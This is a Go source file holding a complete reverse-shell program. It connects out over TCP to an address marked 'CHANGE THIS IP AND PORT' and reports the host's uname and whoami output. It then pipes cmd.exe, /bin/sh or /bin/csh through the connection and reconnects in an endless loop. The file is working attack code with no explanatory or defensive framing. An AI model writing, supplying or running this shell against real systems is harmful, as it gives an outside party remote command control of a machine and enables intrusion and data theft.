package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
)

func CmdExec(args ...string) string {
	baseCmd := args[0]
	cmdArgs := args[1:]
	cmd := exec.Command(baseCmd, cmdArgs...)
	out, _ := cmd.Output()
	return string(out)
}

func main() {
	var cmd *exec.Cmd
	for {
    
    // CHANGE THIS IP AND PORT
		conn, err := net.Dial("tcp", "127.0.0.1:2233")
		
    if err != nil {
			os.Exit(1)
		}
		switch runtime.GOOS {
		case "windows":
			cmd = exec.Command("cmd.exe")
		case "linux":
			cmd = exec.Command("/bin/sh")
			fmt.Fprintf(conn, CmdExec("uname", "-a"))
			fmt.Fprintf(conn, "User: "+CmdExec("whoami"))
		case "freebsd":
			cmd = exec.Command("/bin/csh")
			fmt.Fprintf(conn, CmdExec("uname", "-a"))
			fmt.Fprintf(conn, "User: "+CmdExec("whoami"))
		default:
			cmd = exec.Command("/bin/sh")
			fmt.Fprintf(conn, CmdExec("uname", "-a"))
			fmt.Fprintf(conn, "User: "+CmdExec("whoami"))
		}
		cmd.Stdin = conn
		cmd.Stdout = conn
		cmd.Stderr = conn
		cmd.Run()
	}
}
